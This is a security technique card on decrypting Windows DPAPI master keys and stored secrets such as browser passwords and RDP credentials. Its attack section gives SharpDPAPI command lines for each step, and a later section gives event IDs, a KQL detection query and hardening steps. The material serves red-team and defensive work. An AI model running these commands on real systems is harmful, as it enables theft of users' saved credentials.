# [CA-STORE-001]: DPAPI Credential Decryption

## Metadata
| Attribute | Details |
|---|---|
| **Technique ID** | CA-STORE-001 |
| **MITRE ATT&CK v18.1** | [Credentials from Password Stores: Windows Credential Manager (T1555.004)](https://attack.mitre.org/techniques/T1555/004/) |
| **Tactic** | Credential Access |
| **Platforms** | Windows Endpoint |
| **Severity** | **High** |
| **Author** | SERVTEP (Pchelnikau Artur) |

## 2. EXECUTIVE SUMMARY
- **Concept:** The Data Protection API (DPAPI) encrypts most user secrets on Windows (e.g., Chrome cookies, RDP saved passwords, Wi-Fi keys). Encrypted blobs are protected by a "Master Key" located in `%APPDATA%\Microsoft\Protect\`. An attacker can decrypt this Master Key using the user's password (or NTLM hash), or the Domain Backup Key (if Domain Admin), and subsequently decrypt all stored secrets.
- **Attack Surface:** `CryptUnprotectData` API and DPAPI Master Key files.
- **Business Impact:** **Mass Credential Theft**. Access to all saved browser passwords, VPN configs, and application secrets.

## 3. PREREQUISITES & CONFIGURATION
- **Required Privileges:** User Access (for their own data) or SYSTEM (for Machine keys).
- **Vulnerable Config:** Users saving passwords in browsers or RDP files.
- **Tools:**
    - [Mimikatz](https://github.com/gentilkiwi/mimikatz)
    - [SharpDPAPI](https://github.com/GhostPack/SharpDPAPI)

## 4. ATTACK (Red Team Operations)

#### 4.1 Usage
**Step 1: Triage**
List available Master Keys and blobs.
```powershell
.\SharpDPAPI.exe triage
```

**Step 2: Decrypt Master Key**
Decrypt the Master Key using the current user's password/hash or Domain Backup Key.
```powershell
# Using the user's plaintext password (if known/phished)
.\SharpDPAPI.exe masterkeys /password:MyPassword123!

# Using the Domain Backup Key (requires Domain Admin/DCSync)
.\SharpDPAPI.exe masterkeys /backupkey:KEY_FROM_AD
```

**Step 3: Decrypt Secrets**
Use the decrypted Master Key to unlock blobs (Chrome, RDP).
```powershell
.\SharpDPAPI.exe credentials /masterkey:GUID_FROM_ABOVE
```

## 5. DETECTION (Blue Team Operations)

#### 5.1 Event Logs
| Source | Event ID | Filter Logic |
|---|---|---|
| **Security** | 4692 | Backup of data protection master key was attempted (Domain Backup Key usage). |
| **Security** | 4693 | Recovery of data protection master key was attempted. |

#### 5.2 Sentinel (KQL)
```kusto
SecurityEvent
| where EventID in (4692, 4693)
| where ProcessName has "mimikatz" or ProcessName has "sharpdpapi"
```

## 6. DEFENSE & REMEDIATION (Hardening)

#### 6.2 Immediate Remediation
*   **Credential Guard:** Isolate the LSA to prevent extraction of the user's credentials needed to derive the Master Key locally.
*   **Policy:** Disable "Offer to save passwords" in Browser GPOs.

## 7. ATTACK CHAIN
> **Preceding Technique:** [IA-VALID-001]
> **Next Logical Step:** [LAT-AD-001] (Using decrypted RDP password)
